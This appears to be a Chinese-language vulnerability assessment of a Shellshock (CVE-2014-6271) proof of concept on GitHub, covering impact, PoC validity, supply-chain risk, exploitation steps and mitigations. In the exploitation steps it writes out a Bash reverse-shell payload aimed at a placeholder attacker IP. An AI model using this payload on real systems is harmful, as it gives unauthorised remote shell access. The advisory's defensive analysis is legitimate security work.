## CVE-2014-6271 Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程命令执行

**影响应用:** GNU Bash

**危害等级:** 高危，允许远程攻击者执行任意代码

**影响版本:** <= 4.3

**利用条件:** 目标系统使用Bash，并且存在可以通过环境变量传递参数的CGI脚本或其他服务。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271（Shellshock）是一个存在于GNU Bash中的远程命令执行漏洞。漏洞的根源在于Bash处理环境变量中函数定义后附加字符串的方式。攻击者可以通过构造包含恶意代码的环境变量，利用诸如Apache HTTP Server的mod_cgi模块、OpenSSH的ForceCommand功能、DHCP客户端脚本等场景，跨越权限边界执行任意shell命令。

**有效性评估：**

提供的漏洞利用代码（shellshock_exploit.py）旨在利用Shellshock漏洞，通过向目标URL发送特制的HTTP请求，其中User-Agent头包含恶意Bash代码，从而在目标服务器上执行任意命令。

README.md 文件中提供了检测和利用该漏洞的步骤。

根据漏洞库信息和搜索结果，该漏洞是一个广泛存在的严重漏洞，影响大量系统和服务。提供的POC代码与漏洞描述一致，因此，该POC代码**有效**。

**投毒风险评估：**

检查`shellshock_exploit.py`脚本和`README.md`文件，未发现明显的恶意代码。脚本的主要功能是构造包含漏洞利用代码的HTTP请求，并在本地监听反弹shell。风险点可能在于以下几点：

1.  **Payload定制：** 脚本允许指定LHOST和LPORT，如果用户不小心使用了错误的IP地址或端口，可能会导致连接到恶意服务器。
2.  **依赖性：** 脚本依赖于`requests`库，如果安装了被篡改的`requests`库，可能会存在风险。
3.  **Netcat依赖：** 脚本依赖于本地的 `nc` 命令, 如果本地的 `nc` 命令被恶意替换, 可能存在风险。

总体而言，该代码的投毒风险较低，主要集中在使用者的误操作和对外部依赖项的信任上。投毒风险估计为10%。

**漏洞利用方式：**

1.  **确定目标：** 找到运行存在漏洞Bash版本的服务器，并且该服务器运行着可以通过环境变量传递参数的服务，例如CGI脚本。
2.  **构造Payload：** 构造包含恶意Bash代码的环境变量，例如：`() { :; }; /bin/bash -i >& /dev/tcp/attacker_ip/attacker_port 0>&1`
3.  **发送请求：** 通过HTTP请求或其他方式将构造的Payload作为环境变量传递给目标服务器。
4.  **执行命令：** 目标服务器上的Bash解释器会执行恶意代码，从而执行攻击者指定的命令。
5.  **反弹Shell：** 在上面的Payload示例中，恶意代码会尝试创建一个反弹Shell，将目标服务器的Shell连接到攻击者的IP地址和端口。

**缓解措施：**

1.  升级Bash到最新版本。
2.  检查和更新所有使用Bash脚本的服务，确保它们不会受到环境变量的影响。
3.  使用入侵检测系统（IDS）和入侵防御系统（IPS）来检测和阻止Shellshock攻击。

**项目地址:** [Jsmoreira02/CVE-2014-6271](https://github.com/Jsmoreira02/CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)